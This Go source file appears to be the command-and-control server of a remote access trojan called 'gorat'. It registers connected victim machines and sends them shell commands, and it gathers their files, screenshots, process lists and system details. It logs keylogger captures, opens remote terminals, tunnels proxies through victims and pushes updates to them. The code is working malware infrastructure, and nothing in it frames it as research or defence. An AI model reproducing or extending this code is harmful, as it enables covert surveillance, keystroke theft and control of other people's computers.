package server

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"

	"gorat/pkg/api"
	"gorat/pkg/auth"
	"gorat/pkg/clients"
	"gorat/pkg/messaging"
	"gorat/pkg/protocol"
	"gorat/pkg/proxy"
	"gorat/pkg/storage"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	CheckOrigin: func(r *http.Request) bool {
		return true // In production, implement proper origin checking
	},
}

// Server represents the main server
type Server struct {
	manager            clients.Manager
	store              storage.Store
	config             *Config
	authenticator      *Authenticator
	webHandler         *WebHandler
	terminalProxy      *TerminalProxy
	proxyManager       *ProxyManager
	proxyHandler       *proxy.ProxyHandler
	adminHandler       *api.AdminHandler
	dispatcher         messaging.Dispatcher
	commandResults     map[string]*protocol.CommandResultPayload
	fileListResults    map[string]*protocol.FileListPayload
	driveListResults   map[string]*protocol.DriveListPayload
	fileDataResults    map[string]*protocol.FileDataPayload
	screenshotResults  map[string]*protocol.ScreenshotDataPayload
	processListResults map[string]*protocol.ProcessListPayload
	systemInfoResults  map[string]*protocol.SystemInfoPayload
	resultsMu          sync.RWMutex
	httpServer         *http.Server
	serverMu           sync.Mutex
	started            bool
	startedMu          sync.Mutex
}

// Config holds server configuration
type Config struct {
	Address     string
	CertFile    string
	KeyFile     string
	AuthToken   string
	UseTLS      bool
	WebUsername string
	WebPassword string
}

// NewServer creates a new server instance
func NewServer(config *Config) *Server {
	manager := clients.NewManager()
	manager.Start()
	sessionMgr := auth.NewSessionManager(24 * time.Hour)
	terminalProxy := NewTerminalProxy(manager, sessionMgr)

	// Initialize client store
	store, err := storage.NewSQLiteStore("clients.db")
	if err != nil {
		log.Printf("ERROR: Failed to create client store: %v", err)
		log.Println("Server will continue without persistent storage")
		store = nil // Continue without store
	}

	webConfig := &WebConfig{
		Username: config.WebUsername,
		Password: config.WebPassword,
	}

	webHandler, err := NewWebHandler(sessionMgr, manager, store, webConfig)
	if err != nil {
		log.Printf("ERROR: Failed to create web handler: %v", err)
		log.Println("Server will continue with limited web functionality")
		webHandler = nil // Explicitly set to nil
	}

	// Initialize ProxyManager first
	proxyMgr := NewProxyManager(manager, store)

	server := &Server{
		manager:            manager,
		store:              store,
		config:             config,
		authenticator:      NewAuthenticator(config.AuthToken),
		webHandler:         webHandler,
		terminalProxy:      terminalProxy,
		proxyManager:       proxyMgr,
		proxyHandler:       proxy.NewProxyHandler(manager, store, proxyMgr),
		adminHandler:       api.NewAdminHandler(manager, store),
		dispatcher:         messaging.NewDispatcher(),
		commandResults:     make(map[string]*protocol.CommandResultPayload),
		fileListResults:    make(map[string]*protocol.FileListPayload),
		driveListResults:   make(map[string]*protocol.DriveListPayload),
		fileDataResults:    make(map[string]*protocol.FileDataPayload),
		screenshotResults:  make(map[string]*protocol.ScreenshotDataPayload),
		processListResults: make(map[string]*protocol.ProcessListPayload),
		systemInfoResults:  make(map[string]*protocol.SystemInfoPayload),
	}

	// Initialize message dispatcher with handlers
	server.initializeDispatcher()

	// Set server reference in web handler
	if webHandler != nil {
		webHandler.server = server
	}

	return server
}

// initializeDispatcher sets up message handlers for the dispatcher
func (s *Server) initializeDispatcher() {
	// Register standard message handlers
	s.dispatcher.Register(messaging.NewHeartbeatHandler(s))
	s.dispatcher.Register(messaging.NewCommandResultHandler(s))
	s.dispatcher.Register(messaging.NewFileListHandler(s))
	s.dispatcher.Register(messaging.NewDriveListHandler(s))
	s.dispatcher.Register(messaging.NewProcessListHandler(s))
	s.dispatcher.Register(messaging.NewSystemInfoHandler(s))
	s.dispatcher.Register(messaging.NewFileDataHandler(s))
	s.dispatcher.Register(messaging.NewScreenshotDataHandler(s))
	s.dispatcher.Register(messaging.NewKeyloggerDataHandler())
	s.dispatcher.Register(messaging.NewUpdateStatusHandler())
	s.dispatcher.Register(messaging.NewTerminalOutputHandler(s.terminalProxy.HandleTerminalOutput))
	s.dispatcher.Register(messaging.NewPongHandler())
	log.Println("Message dispatcher initialized with all handlers")
}

// NewServerWithRecovery creates a new server with error recovery
func NewServerWithRecovery(config *Config) (*Server, error) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED during server creation: %v", r)
		}
	}()

	return NewServer(config), nil
}

// NewServerWithServices creates a new server using Services (dependency injection)
func NewServerWithServices(services *Services) (*Server, error) {
	if services == nil {
		return nil, fmt.Errorf("services cannot be nil")
	}

	manager := services.ClientMgr
	store := services.Storage

	// Create webHandler with proper configuration
	webConfig := &WebConfig{
		Username: services.Config.WebUI.Username,
		Password: services.Config.WebUI.Password,
	}

	webHandler, err := NewWebHandler(services.SessionMgr, manager, store, webConfig)
	if err != nil {
		log.Printf("WARNING: Failed to create web handler: %v", err)
		log.Println("Server will continue with API-only functionality")
		webHandler = nil
	}

	server := &Server{
		manager: manager,
		store:   store,
		config: &Config{
			Address:     services.Config.Address,
			UseTLS:      services.Config.TLS.Enabled,
			CertFile:    services.Config.TLS.CertFile,
			KeyFile:     services.Config.TLS.KeyFile,
			WebUsername: services.Config.WebUI.Username,
			WebPassword: services.Config.WebUI.Password,
		},
		authenticator:      NewAuthenticator(""),
		webHandler:         webHandler, // Properly initialize the webHandler
		terminalProxy:      services.TermProxy,
		proxyManager:       services.ProxyMgr,
		proxyHandler:       proxy.NewProxyHandler(manager, store, services.ProxyMgr),
		adminHandler:       api.NewAdminHandler(manager, store),
		dispatcher:         messaging.NewDispatcher(),
		commandResults:     make(map[string]*protocol.CommandResultPayload),
		fileListResults:    make(map[string]*protocol.FileListPayload),
		driveListResults:   make(map[string]*protocol.DriveListPayload),
		fileDataResults:    make(map[string]*protocol.FileDataPayload),
		screenshotResults:  make(map[string]*protocol.ScreenshotDataPayload),
		processListResults: make(map[string]*protocol.ProcessListPayload),
		systemInfoResults:  make(map[string]*protocol.SystemInfoPayload),
	}

	// Initialize message dispatcher
	server.initializeDispatcher()

	// Set server reference in web handler
	if webHandler != nil {
		webHandler.server = server
	}

	return server, nil
}

// Shutdown gracefully shuts down the server
func (s *Server) Shutdown(ctx context.Context) error {
	log.Println("Initiating graceful shutdown...")

	s.startedMu.Lock()
	s.started = false
	s.startedMu.Unlock()

	s.serverMu.Lock()
	httpServer := s.httpServer
	s.serverMu.Unlock()

	// Shutdown HTTP server if running
	if httpServer != nil {
		log.Println("Shutting down HTTP server...")
		if err := httpServer.Shutdown(ctx); err != nil {
			log.Printf("Error shutting down HTTP server: %v", err)
			// Force close if graceful shutdown fails
			httpServer.Close()
		}
	}

	// Close all client connections
	clients := s.manager.GetAllClients()
	for _, client := range clients {
		log.Printf("Closing connection to client: %s", client.ID())
		conn := client.Conn()
		if conn != nil {
			conn.Close()
		}
		client.Close()
	}

	// Close database if available
	if s.store != nil {
		if err := s.store.Close(); err != nil {
			log.Printf("Error closing database: %v", err)
		}
	}

	log.Println("Graceful shutdown complete")
	return nil
} // Start starts the server
func (s *Server) Start() error {
	// Prevent duplicate starts
	s.startedMu.Lock()
	if s.started {
		log.Println("Server already started, skipping duplicate start")
		s.startedMu.Unlock()
		return nil
	}
	s.started = true
	s.startedMu.Unlock()

	// Manager is already started in NewServer()

	// Start background task to mark offline clients
	go s.monitorClientStatus()

	// Load previously saved clients from database
	go s.loadSavedClients()

	// Load previously saved proxies from database
	go s.loadSavedProxies()

	// Create Gin router
	router := gin.Default()
	// Trust Cloudflare and proxy headers for real client IP extraction
	// Note: For production, consider programmatically updating with Cloudflare IP ranges.
	// Limit trusted proxies; do not trust arbitrary proxies by default
	// In production, set Cloudflare IP ranges here.
	_ = router.SetTrustedProxies([]string{"127.0.0.1"})
	router.RemoteIPHeaders = []string{"CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"}
	router.ForwardedByClientIP = true

	// Add CORS middleware
	router.Use(CORSMiddleware())

	// WebSocket endpoint for clients
	router.GET("/ws", s.ginHandleWebSocket)

	// API endpoints
	router.GET("/api/clients", s.ginHandleClientsAPI)
	router.POST("/api/command", s.ginHandleSendCommand)
	router.GET("/api/terminal", s.ginHandleTerminalWebSocket)

	// Proxy API endpoints
	router.POST("/api/proxy/create", s.ginHandleProxyCreate)
	router.GET("/api/proxy/list", s.ginHandleProxyList)
	router.POST("/api/proxy/close", s.ginHandleProxyClose)
	router.GET("/api/proxy/suggest", s.ginHandleProxySuggestPorts)
	router.POST("/api/proxy/edit", s.ginHandleProxyEdit)
	router.GET("/api/proxy/stats", s.ginHandleProxyStats)

	// Client management endpoints
	router.GET("/api/client", s.ginHandleClientGetQuery) // Support both /api/client?id=... and /api/client/:id
	router.GET("/api/client/:id", s.ginHandleClientGet)
	router.POST("/api/client/alias", s.ginHandleUpdateClientAlias)
	router.GET("/api/files", s.ginHandleFilesAPI)
	router.GET("/api/processes", s.ginHandleProcessesAPI)
	router.GET("/api/system-info", s.ginHandleSystemInfoAPI)
	router.GET("/api/proxy-file", s.ginProxyFileServer)

	// Admin API endpoints (new)
	router.GET("/admin/api/clients", s.adminHandler.HandleClientsList)
	router.GET("/admin/api/proxies", s.adminHandler.HandleProxyList)
	router.GET("/admin/api/users", s.adminHandler.HandleUsersList)
	router.DELETE("/admin/api/client/:id", s.adminHandler.HandleDeleteClient)
	router.DELETE("/admin/api/proxy/:id", s.adminHandler.HandleDeleteProxy)
	router.GET("/admin/api/stats", s.adminHandler.HandleGetStats)

	// Settings API endpoints
	router.GET("/admin/api/settings", s.adminHandler.HandleGetSettings)
	router.POST("/admin/api/settings", s.adminHandler.HandleSaveSettings)

	// Public settings API endpoints (for dashboard)
	router.GET("/api/settings", s.adminHandler.HandleGetSettings)
	router.POST("/api/settings", s.adminHandler.HandleSaveSettings)
	router.POST("/api/push-update", s.adminHandler.HandlePushUpdate)

	// Web UI routes (migrate from old handler)
	if s.webHandler != nil {
		s.webHandler.RegisterGinRoutes(router)
	} else {
		log.Println("WARNING: WebHandler is nil, skipping web UI routes registration")
		// Register minimal fallback routes
		router.GET("/", func(c *gin.Context) {
			c.JSON(http.StatusServiceUnavailable, gin.H{"error": "Web UI not available"})
		})
	}

	log.Printf("Server starting on %s", s.config.Address)

	// Only use TLS if explicitly enabled (default is HTTP for nginx reverse proxy)
	if s.config.UseTLS && s.config.CertFile != "" && s.config.KeyFile != "" {
		tlsConfig := &tls.Config{
			MinVersion: tls.VersionTLS12,
			CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			},
		}

		server := &http.Server{
			Addr:      s.config.Address,
			Handler:   router,
			TLSConfig: tlsConfig,
		}

		s.serverMu.Lock()
		s.httpServer = server
		s.serverMu.Unlock()

		log.Printf("Using direct TLS")
		return server.ListenAndServeTLS(s.config.CertFile, s.config.KeyFile)
	}

	// Create HTTP server
	server := &http.Server{
		Addr:    s.config.Address,
		Handler: router,
	}

	s.serverMu.Lock()
	s.httpServer = server
	s.serverMu.Unlock()

	log.Printf("Using HTTP (TLS should be handled by reverse proxy)")
	return server.ListenAndServe()
}

// Gin adapter handlers - these wrap the existing http handlers
func (s *Server) ginHandleWebSocket(c *gin.Context) {
	s.handleWebSocket(c.Writer, c.Request)
}

func (s *Server) ginHandleClientsAPI(c *gin.Context) {
	if s.webHandler != nil {
		s.webHandler.HandleClientsAPI(c.Writer, c.Request)
	} else {
		c.JSON(http.StatusServiceUnavailable, gin.H{"error": "Web handler not available"})
	}
}

func (s *Server) ginHandleSendCommand(c *gin.Context) {
	s.handleSendCommand(c.Writer, c.Request)
}

func (s *Server) ginHandleTerminalWebSocket(c *gin.Context) {
	s.terminalProxy.HandleTerminalWebSocket(c.Writer, c.Request)
}

func (s *Server) ginHandleProxyCreate(c *gin.Context) {
	s.proxyHandler.HandleProxyCreate(c)
}

func (s *Server) ginHandleProxyList(c *gin.Context) {
	s.proxyHandler.HandleProxyList(c)
}

func (s *Server) ginHandleProxyClose(c *gin.Context) {
	s.proxyHandler.HandleProxyClose(c)
}

func (s *Server) ginHandleProxySuggestPorts(c *gin.Context) {
	s.proxyHandler.HandleProxySuggestPorts(c)
}

func (s *Server) ginHandleProxyEdit(c *gin.Context) {
	s.proxyHandler.HandleProxyEdit(c)
}

func (s *Server) ginHandleProxyStats(c *gin.Context) {
	s.proxyHandler.HandleProxyStats(c)
}

func (s *Server) ginHandleClientGet(c *gin.Context) {
	s.HandleClientGet(c.Writer, c.Request)
}

func (s *Server) ginHandleClientGetQuery(c *gin.Context) {
	// Support query parameter ?id= for backward compatibility
	clientID := c.Query("id")
	if clientID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Client ID required"})
		return
	}

	// Get the client from the manager
	client, exists := s.manager.GetClient(clientID)
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "Client not found"})
		return
	}

	// Return metadata - extract from client using interface methods
	meta := client.Metadata()
	if meta == nil {
		meta = &protocol.ClientMetadata{
			ID:     client.ID(),
			Status: "unknown",
		}
	} else if meta.ID == "" {
		// Ensure ID is populated if missing
		meta.ID = client.ID()
	}

	c.JSON(http.StatusOK, meta)
}

func (s *Server) ginHandleUpdateClientAlias(c *gin.Context) {
	s.HandleUpdateClientAlias(c.Writer, c.Request)
}

func (s *Server) ginHandleFilesAPI(c *gin.Context) {
	s.HandleFilesAPI(c.Writer, c.Request)
}

func (s *Server) ginHandleProcessesAPI(c *gin.Context) {
	s.HandleProcessesAPI(c.Writer, c.Request)
}

func (s *Server) ginHandleSystemInfoAPI(c *gin.Context) {
	s.HandleSystemInfoAPI(c.Writer, c.Request)
}

func (s *Server) ginProxyFileServer(c *gin.Context) {
	s.proxyHandler.HandleProxyFileServer(c)
}

// getClientIP extracts the real client IP from request headers
func getClientIP(r *http.Request) string {
	// Try X-Forwarded-For first (nginx proxy)
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		// Take the first IP in the list
		if idx := len(xff); idx > 0 {
			if commaIdx := 0; commaIdx < idx {
				for i, c := range xff {
					if c == ',' {
						return xff[:i]
					}
				}
				return xff
			}
		}
	}

	// Try X-Real-IP
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}

	// Fallback to RemoteAddr
	if idx := len(r.RemoteAddr); idx > 0 {
		for i := idx - 1; i >= 0; i-- {
			if r.RemoteAddr[i] == ':' {
				return r.RemoteAddr[:i]
			}
		}
	}
	return r.RemoteAddr
}

// handleWebSocket handles WebSocket connections
func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}

	// Wait for authentication message
	var authMsg protocol.Message
	err = conn.ReadJSON(&authMsg)
	if err != nil {
		log.Printf("Failed to read auth message: %v", err)
		conn.Close()
		return
	}

	if authMsg.Type != protocol.MsgTypeAuth {
		log.Printf("Expected auth message, got: %s", authMsg.Type)
		conn.Close()
		return
	}

	var authPayload protocol.AuthPayload
	err = authMsg.ParsePayload(&authPayload)
	if err != nil {
		log.Printf("Failed to parse auth payload: %v", err)
		conn.Close()
		return
	}

	// Authenticate client - accept machine ID as valid token
	authenticated := authPayload.ClientID == authPayload.Token
	token := authPayload.ClientID

	// Send authentication response
	respPayload := &protocol.AuthResponsePayload{
		Success: authenticated,
		Token:   token,
	}

	if !authenticated {
		respPayload.Message = "Authentication failed"
		respMsg, _ := protocol.NewMessage(protocol.MsgTypeAuthResponse, respPayload)
		conn.WriteJSON(respMsg)
		conn.Close()
		return
	}

	respPayload.Message = "Authentication successful"
	respMsg, _ := protocol.NewMessage(protocol.MsgTypeAuthResponse, respPayload)
	conn.WriteJSON(respMsg)

	// Get public IP from request headers
	publicIP := getClientIP(r)

	// Create client metadata
	metadata := &protocol.ClientMetadata{
		ID:          authPayload.ClientID,
		Token:       token,
		OS:          authPayload.OS,
		Arch:        authPayload.Arch,
		Hostname:    authPayload.Hostname,
		IP:          authPayload.IP,
		PublicIP:    publicIP,
		Status:      "online",
		ConnectedAt: time.Now(),
		LastSeen:    time.Now(),
	}

	// Load saved metadata (including alias) if available
	if s.store != nil {
		if savedClient, err := s.store.GetClient(authPayload.ClientID); err == nil && savedClient != nil {
			// Preserve the alias from saved data
			metadata.Alias = savedClient.Alias
		}
	}

	// Register client with the manager
	client, err := s.manager.RegisterClient(authPayload.ClientID, conn)
	if err != nil {
		log.Printf("Failed to register client: %v", err)
		conn.Close()
		return
	}

	// Update metadata with initial values (after registration)
	client.UpdateMetadata(func(m *protocol.ClientMetadata) {
		m.Token = token
		m.OS = authPayload.OS
		m.Arch = authPayload.Arch
		m.Hostname = authPayload.Hostname
		m.IP = authPayload.IP
		m.PublicIP = publicIP
		m.Status = "online"
		m.ConnectedAt = time.Now()
		m.LastSeen = time.Now()
		if metadata.Alias != "" {
			m.Alias = metadata.Alias
		}
	})

	// Restore proxies for this client if it was previously configured
	if s.proxyManager == nil {
		s.proxyManager = NewProxyManager(s.manager, s.store)
	}
	go s.proxyManager.RestoreProxiesForClient(client.ID())

	// Start goroutines for reading and writing
	go s.readPump(client)
	go s.writePump(client)
}

// readPump reads messages from the client
func (s *Server) readPump(client clients.Client) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED in readPump for client %s: %v", client.ID(), r)
		}
		s.manager.UnregisterClient(client.ID())
		conn := client.Conn()
		if conn != nil {
			conn.Close()
		}
	}()

	conn := client.Conn()
	if conn == nil {
		return
	}

	conn.SetReadDeadline(time.Now().Add(90 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(90 * time.Second))
		return nil
	})

	for {
		// First, read as raw JSON to check the message type
		var rawMsg map[string]interface{}
		err := conn.ReadJSON(&rawMsg)
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WebSocket error: %v", err)
			}
			break
		}

		// Update last seen
		s.manager.UpdateClientMetadata(client.ID(), func(m *protocol.ClientMetadata) {
			m.LastSeen = time.Now()
		})

		// Check if this is a proxy message
		if msgType, ok := rawMsg["type"].(string); ok {
			switch msgType {
			case "proxy_data":
				// Handle proxy data message
				proxyID, _ := rawMsg["proxy_id"].(string)
				userID, _ := rawMsg["user_id"].(string)

				// Data is base64 encoded string
				var data []byte
				if dataVal, ok := rawMsg["data"]; ok {
					if dataStr, ok := dataVal.(string); ok {
						// Decode from base64
						decodedData, err := base64.StdEncoding.DecodeString(dataStr)
						if err != nil {
							log.Printf("Error decoding base64 proxy data: %v", err)
							data = []byte(dataStr) // Fallback to raw string if not valid base64
						} else {
							data = decodedData
						}
					}
				}

				if s.proxyManager != nil && proxyID != "" && userID != "" {
					if err := s.proxyManager.HandleProxyDataFromClient(proxyID, userID, data); err != nil {
						log.Printf("Error handling proxy data: %v", err)
					}
				}
				continue

			case "proxy_disconnect":
				// Handle proxy disconnect message - user closed the connection
				proxyID, _ := rawMsg["proxy_id"].(string)
				userID, _ := rawMsg["user_id"].(string)

				if s.proxyManager != nil && proxyID != "" && userID != "" {
					if err := s.proxyManager.HandleProxyDisconnect(proxyID, userID); err != nil {
						log.Printf("Error handling proxy disconnect: %v", err)
					}
				}
				continue
			}
		}

		// Not a proxy message, parse as protocol.Message
		jsonData, _ := json.Marshal(rawMsg)
		var msg protocol.Message
		if err := json.Unmarshal(jsonData, &msg); err != nil {
			log.Printf("Failed to parse message from %s: %v", client.ID(), err)
			continue
		}
		// Handle message
		s.handleMessage(client, &msg)
	}
}

func (s *Server) writePump(client clients.Client) {
	// The new pkg/clients Manager handles write operations internally.
	// This goroutine just needs to monitor the client's connection status
	// and clean up if the client closes.
	ticker := time.NewTicker(30 * time.Second)
	defer func() {
		ticker.Stop()
		// Note: Do NOT close the connection here - pkg/clients manages it
	}()

	conn := client.Conn()
	if conn == nil {
		return
	}

	for {
		select {
		case <-ticker.C:
			// Send ping to keep connection alive
			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				// Connection write failed, client will be cleaned up by readPump
				return
			}
		}

		// Check if client is still connected
		if client.IsClosed() {
			return
		}
	}
}

// handleMessage handles incoming messages from clients
func (s *Server) handleMessage(client clients.Client, msg *protocol.Message) {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("PANIC RECOVERED in handleMessage for client %s: %v", client.ID(), r)
		}
	}()

	switch msg.Type {
	case protocol.MsgTypeHeartbeat:
		var hb protocol.HeartbeatPayload
		if err := msg.ParsePayload(&hb); err == nil {
			s.manager.UpdateClientMetadata(client.ID(), func(m *protocol.ClientMetadata) {
				m.Status = hb.Status
				m.LastHeartbeat = time.Now()
			})
		}

	case protocol.MsgTypeCommandResult:
		var cr protocol.CommandResultPayload
		if err := msg.ParsePayload(&cr); err == nil {
			log.Printf("Command result from %s: success=%v, exit_code=%d", client.ID(), cr.Success, cr.ExitCode)
			s.resultsMu.Lock()
			s.commandResults[client.ID()] = &cr
			s.resultsMu.Unlock()
		} else {
			log.Printf("Command result from %s: %s", client.ID(), string(msg.Payload))
		}

	case protocol.MsgTypeFileList:
		var fl protocol.FileListPayload
		if err := msg.ParsePayload(&fl); err == nil {
			log.Printf("File list from %s: %d files", client.ID(), len(fl.Files))
			s.resultsMu.Lock()
			s.fileListResults[client.ID()] = &fl
			s.resultsMu.Unlock()
		} else {
			log.Printf("File list from %s", client.ID())
		}

	case protocol.MsgTypeDriveList:
		var dl protocol.DriveListPayload
		if err := msg.ParsePayload(&dl); err == nil {
			log.Printf("Drive list from %s: %d drives", client.ID(), len(dl.Drives))
			s.resultsMu.Lock()
			s.driveListResults[client.ID()] = &dl
			s.resultsMu.Unlock()
		} else {
			log.Printf("Drive list from %s", client.ID())
		}

	case protocol.MsgTypeProcessList:
		var pl protocol.ProcessListPayload
		if err := msg.ParsePayload(&pl); err == nil {
			log.Printf("Process list from %s: %d processes", client.ID(), len(pl.Processes))
			s.SetProcessListResult(client.ID(), &pl)
		} else {
			log.Printf("Process list from %s", client.ID())
		}

	case protocol.MsgTypeSystemInfo:
		var si protocol.SystemInfoPayload
		if err := msg.ParsePayload(&si); err == nil {
			log.Printf("System info from %s: %s (%s %s)", client.ID(), si.Hostname, si.OS, si.Arch)
			s.SetSystemInfoResult(client.ID(), &si)
		} else {
			log.Printf("System info from %s", client.ID())
		}

	case protocol.MsgTypeFileData:
		var fd protocol.FileDataPayload
		if err := msg.ParsePayload(&fd); err == nil {
			log.Printf("File data from %s: %s (%d bytes)", client.ID(), fd.Path, len(fd.Data))
			s.resultsMu.Lock()
			s.fileDataResults[client.ID()] = &fd
			s.resultsMu.Unlock()
		} else {
			log.Printf("File data from %s", client.ID())
		}

	case protocol.MsgTypeScreenshotData:
		var sd protocol.ScreenshotDataPayload
		if err := msg.ParsePayload(&sd); err == nil {
			log.Printf("Screenshot received from %s: %dx%d, %d bytes", client.ID(), sd.Width, sd.Height, len(sd.Data))
			s.resultsMu.Lock()
			s.screenshotResults[client.ID()] = &sd
			s.resultsMu.Unlock()
		} else {
			log.Printf("Screenshot received from %s", client.ID())
		}

	case protocol.MsgTypeKeyloggerData:
		var kld protocol.KeyloggerDataPayload
		if err := msg.ParsePayload(&kld); err == nil {
			log.Printf("Keylogger data from %s: %s", client.ID(), kld.Keys)
		}

	case protocol.MsgTypeUpdateStatus:
		var us protocol.UpdateStatusPayload
		if err := msg.ParsePayload(&us); err == nil {
			log.Printf("Update status from %s: %s - %s", client.ID(), us.Status, us.Message)
		}

	case protocol.MsgTypeTerminalOutput:
		var to protocol.TerminalOutputPayload
		if err := msg.ParsePayload(&to); err == nil {
			s.terminalProxy.HandleTerminalOutput(to.SessionID, to.Data, false)
		}

	case protocol.MsgTypePong:
		// Heartbeat response

	default:
		log.Printf("Unknown message type from %s: %s", client.ID(), msg.Type)
	}
}

// handleGetClients returns list of connected clients
func (s *Server) handleGetClients(w http.ResponseWriter, r *http.Request) {
	clients := s.manager.GetAllClients()
	metadata := make([]*protocol.ClientMetadata, len(clients))

	for i, client := range clients {
		meta := client.Metadata()
		if meta != nil {
			metadata[i] = meta
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(metadata)
}

// handleSendCommand sends a command to a specific client
func (s *Server) handleSendCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		ClientID string                         `json:"client_id"`
		Command  protocol.ExecuteCommandPayload `json:"command"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	msg, err := protocol.NewMessage(protocol.MsgTypeExecuteCommand, req.Command)
	if err != nil {
		http.Error(w, "Failed to create message", http.StatusInternalServerError)
		return
	}

	if err := s.manager.SendToClient(req.ClientID, msg); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	// Wait briefly for response (up to 30 seconds)
	for i := 0; i < 60; i++ {
		time.Sleep(500 * time.Millisecond)
		s.resultsMu.RLock()
		result, exists := s.commandResults[req.ClientID]
		s.resultsMu.RUnlock()

		if exists {
			// Clear the result after reading
			s.resultsMu.Lock()
			delete(s.commandResults, req.ClientID)
			s.resultsMu.Unlock()

			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"status":  "completed",
				"success": result.Success,
				"output":  result.Output,
				"error":   result.Error,
			})
			return
		}
	}

	// Timeout - command sent but no response yet
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]string{"status": "sent"})
}

// GetCommandResult retrieves stored command result for a client
func (s *Server) GetCommandResult(clientID string) *protocol.CommandResultPayload {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	return s.commandResults[clientID]
}

// SetCommandResult stores command result for a client
func (s *Server) SetCommandResult(clientID string, payload *protocol.CommandResultPayload) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	s.commandResults[clientID] = payload
}

// GetFileListResult retrieves stored file list result for a client
func (s *Server) GetFileListResult(clientID string) *protocol.FileListPayload {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	return s.fileListResults[clientID]
}

// SetFileListResult stores file list result for a client
func (s *Server) SetFileListResult(clientID string, payload *protocol.FileListPayload) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	s.fileListResults[clientID] = payload
}

// ClearFileListResult removes stored file list result
func (s *Server) ClearFileListResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.fileListResults, clientID)
}

// GetDriveListResult retrieves stored drive list result for a client
func (s *Server) GetDriveListResult(clientID string) *protocol.DriveListPayload {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	return s.driveListResults[clientID]
}

// SetDriveListResult stores drive list result for a client
func (s *Server) SetDriveListResult(clientID string, payload *protocol.DriveListPayload) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	s.driveListResults[clientID] = payload
}

// ClearDriveListResult removes stored drive list result
func (s *Server) ClearDriveListResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.driveListResults, clientID)
}

// GetScreenshotResult retrieves stored screenshot result for a client
func (s *Server) GetScreenshotResult(clientID string) *protocol.ScreenshotDataPayload {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	return s.screenshotResults[clientID]
}

// SetScreenshotResult stores screenshot result for a client
func (s *Server) SetScreenshotResult(clientID string, payload *protocol.ScreenshotDataPayload) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	s.screenshotResults[clientID] = payload
}

// ClearScreenshotResult removes stored screenshot result
func (s *Server) ClearScreenshotResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.screenshotResults, clientID)
}

// GetFileDataResult retrieves stored file data result for a client
func (s *Server) GetFileDataResult(clientID string) *protocol.FileDataPayload {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	return s.fileDataResults[clientID]
}

// SetFileDataResult stores file data result for a client
func (s *Server) SetFileDataResult(clientID string, payload *protocol.FileDataPayload) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	s.fileDataResults[clientID] = payload
}

// ClearFileDataResult removes stored file data result
func (s *Server) ClearFileDataResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.fileDataResults, clientID)
}

// GetProcessListResult retrieves stored process list result for a client
func (s *Server) GetProcessListResult(clientID string) *protocol.ProcessListPayload {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	return s.processListResults[clientID]
} // SetProcessListResult stores process list result for a client
func (s *Server) SetProcessListResult(clientID string, payload *protocol.ProcessListPayload) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	s.processListResults[clientID] = payload
}

// ClearProcessListResult removes stored process list result
func (s *Server) ClearProcessListResult(clientID string) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	delete(s.processListResults, clientID)
}

// GetSystemInfoResult retrieves stored system info result for a client
func (s *Server) GetSystemInfoResult(clientID string) *protocol.SystemInfoPayload {
	s.resultsMu.RLock()
	defer s.resultsMu.RUnlock()
	return s.systemInfoResults[clientID]
}

// SetSystemInfoResult stores system info result for a client
func (s *Server) SetSystemInfoResult(clientID string, payload *protocol.SystemInfoPayload) {
	s.resultsMu.Lock()
	defer s.resultsMu.Unlock()
	s.systemInfoResults[clientID] = payload
}

